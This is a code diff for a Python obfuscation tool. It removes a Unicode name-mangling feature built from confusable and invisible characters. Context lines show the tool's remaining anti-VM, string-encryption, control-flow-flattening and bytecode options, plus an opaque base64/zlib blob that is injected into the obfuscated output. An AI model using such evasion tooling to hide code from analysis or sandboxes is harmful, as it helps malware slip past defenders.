@@ -281,111 +281,6 @@ def xor_encrypt(data, key):
     )
 
 
-class _NameGenerator:
-    def __init__(self):
-        self.chaotic_ranges = [
-            (0x0370, 0x03FF),
-            (0x0400, 0x04FF),
-            (0x0590, 0x05FF),
-            (0x0600, 0x06FF),
-            (0x20A0, 0x20CF),
-            (0x2100, 0x214F),
-            (0x2200, 0x22FF),
-            (0x25A0, 0x25FF),
-        ]
-        self.combining_chars_range = (0x0300, 0x036F)
-        self.invisible_chars = ["\u200b", "\u200c", "\u200d"]
-
-    def _get_random_char_from_ranges(self):
-        start, end = random.choice(self.chaotic_ranges)
-        return chr(random.randint(start, end))
-
-    def _get_random_combining_char(self):
-        return chr(random.randint(*self.combining_chars_range))
-
-    def generate(self, min_len=8, max_len=16):
-        while True:
-            length = random.randint(min_len, max_len)
-            name = self._get_random_char_from_ranges()
-            for _ in range(length - 1):
-                if random.random() < 0.8:
-                    name += self._get_random_char_from_ranges()
-                else:
-                    name += self._get_random_combining_char()
-            if random.random() < 0.5:
-                pos = random.randint(1, len(name) - 1)
-                name = name[:pos] + random.choice(self.invisible_chars) + name[pos:]
-            if name.isidentifier():
-                return name
-
-
-class UnicodeMangler(ast.NodeTransformer):
-    def __init__(self):
-        super().__init__()
-        self.names_to_mangle = set()
-        self.name_map = {}
-        self.protected_names = set(dir(__builtins__)) | {"_x", "_d"}
-        self._name_generator = _NameGenerator()
-
-    class _NameCollector(ast.NodeVisitor):
-        def __init__(self, mangler_instance):
-            self.mangler = mangler_instance
-
-        def visit_Name(self, node):
-            if (
-                isinstance(node.ctx, ast.Store)
-                and node.id not in self.mangler.protected_names
-            ):
-                self.mangler.names_to_mangle.add(node.id)
-            self.generic_visit(node)
-
-        def visit_arg(self, node):
-            if node.arg not in self.mangler.protected_names:
-                self.mangler.names_to_mangle.add(node.arg)
-            self.generic_visit(node)
-
-        def visit_FunctionDef(self, node):
-            if node.name not in self.mangler.protected_names:
-                self.mangler.names_to_mangle.add(node.name)
-            self.generic_visit(node)
-
-        def visit_ClassDef(self, node):
-            if node.name not in self.mangler.protected_names:
-                self.mangler.names_to_mangle.add(node.name)
-            self.generic_visit(node)
-
-    def _rename_if_needed(self, original_name):
-        if original_name in self.names_to_mangle:
-            if original_name not in self.name_map:
-                self.name_map[original_name] = self._name_generator.generate()
-            return self.name_map[original_name]
-        return original_name
-
-    def visit_Name(self, node):
-        node.id = self._rename_if_needed(node.id)
-        return node
-
-    def visit_arg(self, node):
-        node.arg = self._rename_if_needed(node.arg)
-        return node
-
-    def visit_FunctionDef(self, node):
-        node.name = self._rename_if_needed(node.name)
-        self.generic_visit(node)
-        return node
-
-    def visit_ClassDef(self, node):
-        node.name = self._rename_if_needed(node.name)
-        self.generic_visit(node)
-        return node
-
-    def mangle(self, tree: ast.AST) -> ast.AST:
-        collector = self._NameCollector(self)
-        collector.visit(tree)
-        mangled_tree = self.visit(tree)
-        return mangled_tree
-
-
 class StringObfuscator(ast.NodeTransformer):
     def __init__(self):
         self.in_fstring = False
@@ -489,10 +384,6 @@ def obfuscate_code(code):
         enable_anti_vm = input("Enable anti-VM? (y/n): ").strip().lower()
         if sys.version_info < (3, 11):
             print(
-                f"[{Fore.YELLOW}!{Fore.RESET}] Unicode name mangling requires Python 3.11+ to work properly."
-            )
-            enable_name_mangling = "n"
-            print(
                 f"[{Fore.YELLOW}!{Fore.RESET}] Control flow flattening requires Python 3.11+ to work properly."
             )
             enable_flatten = "n"
@@ -505,9 +396,6 @@ def obfuscate_code(code):
             )
             enable_bytecode_obf = "n"
         else:
-            enable_name_mangling = (
-                input("Enable Unicode name mangling? (y/n): ").strip().lower()
-            )
             enable_flatten = (
                 input("Enable control flow flattening? (y/n): ").strip().lower()
             )
@@ -532,18 +420,6 @@ def obfuscate_code(code):
             ("" if len(final_import_calls) == 1 and final_import_calls[0] == "\n" else "\n")
             + "_x(b'eJyVVllv4zYQ3uf0PxTqvkgGUmcvbIEF8uAcixjYtEGdZgsEgaBjJBOmSJakbKtF/3uHknnIsQ1UDwK/meFcJGdG/fjDmzdnJVQRUWkJeVvXIFMhQQHTyeTLWYTfQCesThtethRUdBn903PMF4syj8897KVFF5JEV8K6DClkb1OOsEf/9n9SvTY6JUyDVFBowlmiOjXdMXZemk+CbiWLHmULZ1bRMlOZ1tLsOI/iGnCdFRBPooyVkVFjSckEkxAxrqNfOYMTSrXsPPeVhRT1VTJrQhOOlryfTKu0N3fY2L5Bg2FbgNBRMkMjJG813ErJ5Xn0lNF2WAcpEJlSLnaupgytRpeXUcx07KVGIeyEC90JTPOGsJLS6QokA/rxw3Subnb34mF8LU65HLo9bwSXeufzOIY9TUd9F1yR7Sn3N0QvIy6AJfGFkLy4UECrC6Uz3SpzDiqqXjtdcRlRwvAk2CH2zg8jMUVNUitjJYkfzenJB1J+iQ9kItiJFzYZdgtKMG3P718m0U+X0bvju47lcv/LJWSr15n+7dTNMF+fYbPofznNilVKidL4op+d4NubvP5zulgCpW/Pe7QmsJnCFgycf1uIzoJ7cd2Uv7fMYXUvbllt4QMeBSh1h2ZAWuIiJ3CtJQ3xYl04iFcMk0ZnNS72iXdABcgFyDUpYGB6t63QH3O77fv9fHYze7AwazWXLVP72Nm+aqVYtESDJVxnhPm1zDm7MjmzpCJ3zMXXjBac7ftk6decadTls2AZo1iQ3BlCINbhdXPpvoGCl55ZsuAoYI3hrzeO+ZWUJfWylSRl9rMaKa9L53/dWLL3/Y7z1e1WUC79ljutxYxltPsb5NMvIdVWCZ99NBgsP38KQB2uR5y/wvWIs9n3z9C8xLxpWkZ0Z/2w9JUq20Z43CjMekWcBwx0w1mATNWwkFPalbmTRTVVIHzgenvvTBmCrXBbB+j9NYRAl4QaSqIDOGZKIoIgFthZcr4l7t6oYqkztRqutndCbVtN3EvDVhQoNfLm7Ye4qZ0JXYjw2T9d8e3eXf1OsCEsM7nyBFZmqrHQdBKfu01D3DvbfvzgON7Z7edPltoTX4ZegC+U4RxgSpToW0IymVK+AYkN25RwYeq3UH2gYjiRFJ+wTJ5jIx2/TF56Pb0s8o24r3yjTm7YTjeK7Uzv1VBpCrsRnRxt20MT6xtflLeEYl3adbailRIfaopRFhiSZZqoC9f7zFxgp4pwgxkv0iKjNE2xq2E8x4WwThihw2OMwaMeqngrC0grQrHhYuRK4JxlJqOBYegjG5Mwa+Hm/zvUPOLM0TeqQxPMbg8WSoUpPSMnp9Rdtrky3Z5z5eYIHCTQZ6KtbxZ7i04keTcEFuL/ABuiSfQ=')"
         )
-    if enable_name_mangling in ["y", "yes"]:
-        try:
-            tree = ast.parse(code_to_process)
-            mangler = UnicodeMangler()
-            mangled_tree = mangler.mangle(tree)
-            ast.fix_missing_locations(mangled_tree)
-            code_to_process = ast.unparse(mangled_tree)
-        except Exception as e:
-            print(f"[{Fore.YELLOW}!{Fore.RESET}] Name mangling failed: {e}")
-            import traceback
-
-            traceback.print_exc()
     if enable_flatten in ["y", "yes"]:
         code_to_process = flatten_control_flow(code_to_process)
     if enable_string_obf in ["y", "yes"]:
